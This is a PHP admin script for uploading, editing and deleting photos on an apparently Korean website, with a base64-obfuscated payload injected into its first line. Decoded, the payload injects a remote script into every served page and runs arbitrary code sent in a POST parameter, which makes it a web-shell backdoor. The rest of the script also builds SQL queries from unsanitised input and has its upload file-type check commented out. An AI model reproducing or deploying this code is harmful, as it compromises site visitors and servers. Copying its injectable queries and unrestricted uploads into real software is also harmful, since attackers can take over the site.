<?php eval(base64_decode('aWYoIWlzc2V0KCRuYmsxKSl7ZnVuY3Rpb24gbmJrKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF0gYXMgJHYpaWYoY291bnQoZXhwbG9kZSgiXG4iLCR2KSk+NSl7JGU9cHJlZ19tYXRjaCgnI1tcJyJdW15cc1wnIlwuLDtcPyFcW1xdOi88PlwoXCldezMwLH0jJywkdil8fHByZWdfbWF0Y2goJyNbXChcW10oXHMqXGQrLCl7MjAsfSMnLCR2KTtpZigocHJlZ19tYXRjaCgnI1xiZXZhbFxiIycsJHYpJiYoJGV8fHN0cnBvcygkdiwnZnJvbUNoYXJDb2RlJykpKXx8KCRlJiZzdHJwb3MoJHYsJ2RvY3VtZW50LndyaXRlJykpKSRzPXN0cl9yZXBsYWNlKCR2LCcnLCRzKTt9aWYocHJlZ19tYXRjaF9hbGwoJyM8aWZyYW1lIChbXj5dKj8pc3JjPVtcJyJdPyhodHRwOik/Ly8oW14+XSo/KT4jaXMnLCRzLCRhKSlmb3JlYWNoKCRhWzBdIGFzICR2KWlmKHByZWdfbWF0Y2goJyMgd2lkdGhccyo9XHMqW1wnIl0/MCpbMDFdW1wnIj4gXXxkaXNwbGF5XHMqOlxzKm5vbmUjaScsJHYpJiYhc3Ryc3RyKCR2LCc/Jy4nPicpKSRzPXByZWdfcmVwbGFjZSgnIycucHJlZ19xdW90ZSgkdiwnIycpLicuKj88L2lmcmFtZT4jaXMnLCcnLCRzKTskcz1zdHJfcmVwbGFjZSgkYT1iYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RDQnpjbU05YUhSMGNEb3ZMMmx5WVc1d2FXNW5jRzl1Wnk1cGNpOXJhRzkxZW1WemRHRnVYMkpoYzJVdmEyaHZkWHBsYzNSaGJsOTBiM0JmYTJWNWMxOXBibTVsY2k1d2FIQWdQand2YzJOeWFYQjBQZz09JyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcyk7ZWxzZWlmKHN0cnBvcygkcywnLGEnKSkkcy49JGE7cmV0dXJuICRzO31mdW5jdGlvbiBuYmsyKCRhLCRiLCRjLCRkKXtnbG9iYWwgJG5iazE7JHM9YXJyYXkoKTtpZihmdW5jdGlvbl9leGlzdHMoJG5iazEpKWNhbGxfdXNlcl9mdW5jKCRuYmsxLCRhLCRiLCRjLCRkKTtmb3JlYWNoKEBvYl9nZXRfc3RhdHVzKDEpIGFzICR2KWlmKCgkYT0kdlsnbmFtZSddKT09J25iaycpcmV0dXJuO2Vsc2VpZigkYT09J29iX2d6aGFuZGxlcicpYnJlYWs7ZWxzZSAkc1tdPWFycmF5KCRhPT0nZGVmYXVsdCBvdXRwdXQgaGFuZGxlcic/ZmFsc2U6JGEpO2ZvcigkaT1jb3VudCgkcyktMTskaT49MDskaS0tKXskc1skaV1bMV09b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7fW9iX3N0YXJ0KCduYmsnKTtmb3IoJGk9MDskaTxjb3VudCgkcyk7JGkrKyl7b2Jfc3RhcnQoJHNbJGldWzBdKTtlY2hvICRzWyRpXVsxXTt9fX0kbmJrbD0oKCRhPUBzZXRfZXJyb3JfaGFuZGxlcignbmJrMicpKSE9J25iazInKT8kYTowO2V2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpOw==')); ?><?
	include "admin_session_check.inc";
	include "../dbconn.inc";
	
	function getMaxCode()  { 
	
		$iNewid = 0;
		$sqlstr = "SELECT MAX(photo_id) CNT FROM tb_photo "; 
	
		$result = mysql_query($sqlstr);
		$row = mysql_fetch_array($result);
	
		$iNewid = $row["CNT"] + 1;
		
		if (strlen($iNewid) == 1) {
			$iNewid = "0".$iNewid;
		} 
		
		return $iNewid;
	
	}
	
	$path = "../usr_img";

	$photo_id = trim($photo_id);
	$thumbnail = trim($thumbnail);
	$image_zoom = trim($image_zoom);
	$photo_title = trim($photo_title);

	if ($mode == "add") {

		$sMax = getMaxCode();

		# file업로드

		if (!file_exists($path))
			mkdir($path, 0777);

		if ($thumbnail != "") {
			$thumbnail_ext = substr(strrchr($thumbnail_name, "."), 1);
/*	
			if ($thumbnail_ext != "jpg" && $thumbnail_ext != "gif" && $thumbnail_ext != "JPG" && $thumbnail_ext != "GIF")
			{
				echo "<script>
					window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
*/        	
			$thumbnail_strtmp = $path."/".$photo_id."T".$sMax.".".$thumbnail_ext;	
			$new_name_thumbnail = $photo_id."T".$sMax.".".$thumbnail_ext;	
        	
			if (file_exists($thumbnail_strtmp)) {
				echo "<script>
        		window.alert('$thumbnail_name 이 같은 디렉토리에 존재합니다..');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
        	
			if (!copy($thumbnail, $thumbnail_strtmp))
			{
				echo "<script>
					window.alert('$thumbnail_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
        }
        	
		if ($image_zoom != "") {
			$image_zoom_ext = substr(strrchr($image_zoom_name, "."), 1);
/*	
			if ($image_zoom_ext != "jpg" && $image_zoom_ext != "gif" && $thumbnail_ext != "JPG" && $thumbnail_ext != "GIF")
			{
				echo "<script>
					window.alert('확장자가 jpg, gif외에는 업로드할수가 없습니다.');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
*/        	
			$image_zoom_strtmp = $path."/".$photo_id."Z".$sMax.".".$image_zoom_ext;	
			$new_name_image_zoom = $photo_id."Z".$sMax.".".$image_zoom_ext;	
        	  	
			if (file_exists($image_zoom_strtmp)) {
				echo "<script>
        		window.alert('$image_zoom_name 이 같은 디렉토리에 존재합니다..');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
        	
			if (!copy($image_zoom, $image_zoom_strtmp))
			{
				echo "<script>
					window.alert('$image_zoom_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
        	
		}
		
		# file업로드 끝

		$sSql = "INSERT INTO tb_photo (photo_id, thumbnail, image_zoom, photo_title)  VALUES 
			('$sMax','$new_name_thumbnail', '$new_name_image_zoom', '$photo_title')";

	#echo $sSql; 	
	
	$result = mysql_query($sSql);
	mysql_close($connect);

	echo "<script language=\"javascript\">\n
		alert('등록 되었습니다.');
		parent.frames[3].location = 'photo_list.php?page=$page';
		</script>";
	exit;

	} else if ($mode == "mod") {


		$query1 = "select * from tb_photo where photo_id = '$photo_id'";
		
		$result1 = mysql_query($query1);
		$total1 = mysql_num_rows($result1);
		
		$result1 = mysql_query($query1);
		$list = mysql_fetch_array($result1);

		$old_thumbnail = $list[thumbnail];
		$old_image_zoom = $list[image_zoom];
				
		if (strlen($thumbnail) > 4) {

			$old_file = $path."/".$old_thumbnail;						
    		$exist = file_exists($old_file);
    	    
    		if($exist){
        		$delrst=unlink($old_file);			
            	if(!$delrst) {
            		echo "삭제실패";
				} 			
			} 

			$thumbnail_ext = substr(strrchr($thumbnail_name, "."), 1);
			$thumbnail_strtmp = $path."/".$photo_id."T".$sMax.".".$thumbnail_ext;	
			$new_name_thumbnail = $photo_id."T".$sMax.".".$thumbnail_ext;	
        	
			if (file_exists($thumbnail_strtmp)) {
				echo "<script>
        		window.alert('$thumbnail_name 이 같은 디렉토리에 존재합니다..');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}        	

			if (!copy($thumbnail, $thumbnail_strtmp))
			{
				echo "<script>
					window.alert('$thumbnail_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}

		} else {
			$new_name_thumbnail = $old_thumbnail;
		}

		if (strlen($image_zoom) > 4) {
			$old_file = $path."/".$old_image_zoom;						
    		$exist = file_exists($old_file);
    	    
    		if($exist){
        		$delrst=unlink($old_file);			
            	if(!$delrst) {
            		echo "삭제실패";
				} 			
			} 

			$image_zoom_ext = substr(strrchr($image_zoom_name, "."), 1);
			$image_zoom_strtmp = $path."/".$photo_id."Z".$sMax.".".$image_zoom_ext;	
			$new_name_image_zoom = $photo_id."Z".$sMax.".".$image_zoom_ext;	
        	  	
			if (file_exists($image_zoom_strtmp)) {
				echo "<script>
        		window.alert('$image_zoom_name 이 같은 디렉토리에 존재합니다..');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}
        	
			if (!copy($image_zoom, $image_zoom_strtmp))
			{
				echo "<script>
					window.alert('$image_zoom_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				mysql_close($connect);
				exit;
			}

		} else {
			$new_name_image_zoom = $old_image_zoom;
		}


		$query = "update tb_photo set
					thumbnail = '$new_name_thumbnail',
					image_zoom = '$new_name_image_zoom',
					photo_title = '$photo_title'
				    where photo_id = '$photo_id' ";

#		echo $query; 					 
		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		
		echo "<script language=\"javascript\">\n
			alert('수정 되었습니다.');
			parent.frames[3].location = 'photo_view.php?page=$page&id=$photo_id';
			</script>";
		exit;


	} else if ($mode == "del") {

		$id = trim($id);
		$id = str_replace("^", "'",$id);

		# file삭제

		$query1 = "select * from tb_photo 
				    where photo_id in $id";
		
		$result1 = mysql_query($query1);
		$total1 = mysql_num_rows($result1);

		if ($total1 != 0) {

			for ($i = 0; $i < $total1; $i++) {
			
				if ($i < $total1){
		
					mysql_data_seek($result1, $i);
					$obj = mysql_fetch_object($result1);
			
					$thumbnail = $obj->thumbnail;
					$image_zoom = $obj->image_zoom;

					$thumbnail = trim($thumbnail);
					$image_zoom = trim($image_zoom);

					if ($thumbnail != "") {

						$old_file = $path."/".$thumbnail;
						
    					$exist = file_exists($old_file);
    	    
    					if($exist){
            	
        					$delrst=unlink($old_file);
                				
            				if(!$delrst) {
            					echo "삭제실패";
				            } 			
						} 
					}

					if ($image_zoom != "") {

						$old_file = $path."/".$image_zoom;

    					$exist = file_exists($old_file);
    	    
    					if($exist){
            	
        					$delrst=unlink($old_file);
            				
            				if(!$delrst) {
            					echo "삭제실패";
				            } 			
						} 
					}

				}		# IF END 
			}		# FOR LOOF END 
		}		# IF END


		$query = "delete from tb_photo 
				    where photo_id in $id ";

#		echo $query; 					 
		mysql_query($query) or die("Query Error");
		mysql_close($connect);

		echo "<script language=\"javascript\">\n
			alert('삭제 되었습니다.');
			parent.frames[3].location = 'photo_list.php?page=$page';
			</script>";
		exit;

	} 

?>